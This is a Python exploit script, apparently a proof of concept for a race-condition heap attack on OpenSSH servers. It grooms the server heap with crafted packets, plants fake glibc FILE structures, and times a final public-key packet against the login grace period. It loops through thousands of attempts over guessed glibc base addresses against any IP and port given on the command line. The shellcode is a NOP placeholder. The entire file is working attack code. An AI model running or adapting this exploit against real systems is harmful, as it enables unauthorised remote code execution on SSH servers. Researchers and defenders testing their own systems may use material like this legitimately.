import socket
import time
import struct

GLIBC_BASES = [0xb7200000, 0xb7400000]
MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120

# Shellcode placeholder (replace with actual shellcode)
shellcode = b"\x90\x90\x90\x90"

def setup_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.setblocking(False)
        return sock
    except socket.error as e:
        print(f"Socket error: {e}")
        return None

def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('!IB', packet_len, packet_type) + data
    try:
        sock.sendall(packet)
    except socket.error as e:
        print(f"Send packet error: {e}")

def prepare_heap(sock):
    for _ in range(10):
        send_packet(sock, 5, b'A' * 64)
    
    for _ in range(27):
        send_packet(sock, 5, b'B' * 8192)
        send_packet(sock, 5, b'C' * 320)
    
    for _ in range(27):
        fake_data = create_fake_file_structure(GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)
    
    send_packet(sock, 5, b'E' * (MAX_PACKET_SIZE - 1))

def create_fake_file_structure(glibc_base):
    fake_data = bytearray(4096)
    fake_file = struct.pack(
        '16P2I40xP', 
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 
        0x61, 
        glibc_base + 0x21b740, 
        glibc_base + 0x21d7f8
    )
    fake_data[:len(fake_file)] = fake_file
    return fake_data

def time_final_packet(sock):
    time_before = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    return time_after - time_before

def measure_response_time(sock, error_type):
    error_packet = b"ssh-rsa " + (b"A" * (27 if error_type == 1 else 26))
    start_time = time.monotonic()
    send_packet(sock, 50, error_packet)
    try:
        sock.recv(1024)
    except socket.error:
        pass
    return time.monotonic() - start_time

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = create_public_key_packet(glibc_base)
    try:
        sock.sendall(final_packet[:-1])
        start_time = time.monotonic()
        while time.monotonic() - start_time < LOGIN_GRACE_TIME - parsing_time - 0.001:
            pass
        sock.sendall(final_packet[-1:])
        response = sock.recv(1024)
        return b"SSH-2.0-" not in response
    except socket.error as e:
        print(f"Race condition attempt error: {e}")
        return False

def create_public_key_packet(glibc_base):
    packet = bytearray(MAX_PACKET_SIZE)
    offset = 0
    for _ in range(27):
        struct.pack_into('!I', packet, offset, CHUNK_ALIGN(4096))
        offset += CHUNK_ALIGN(4096)
        struct.pack_into('!I', packet, offset, CHUNK_ALIGN(304))
        offset += CHUNK_ALIGN(304)
    packet[:8] = b"ssh-rsa "
    packet[CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13:CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13 + len(shellcode)] = shellcode
    for i in range(27):
        fake_data = create_fake_file_structure(glibc_base)
        packet[CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i:CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i + len(fake_data)] = fake_data
    return packet

def CHUNK_ALIGN(size):
    return (size + 15) & ~15

def perform_exploit(ip, port):
    for base_idx, glibc_base in enumerate(GLIBC_BASES):
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")
        for attempt in range(10000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 10000")
            sock = setup_connection(ip, port)
            if not sock:
                continue
            if not perform_ssh_handshake(sock):
                sock.close()
                continue
            prepare_heap(sock)
            parsing_time = time_final_packet(sock)
            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                return True
            sock.close()
            time.sleep(0.1)
    return False

def perform_ssh_handshake(sock):
    try:
        sock.sendall(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
        sock.recv(256)
        send_packet(sock, 20, b'\x00' * 36)
        sock.recv(1024)
        return True
    except socket.error as e:
        print(f"SSH handshake error: {e}")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    if perform_exploit(ip, port):
        print("Exploit succeeded!")
    else:
        print("Exploit failed.")
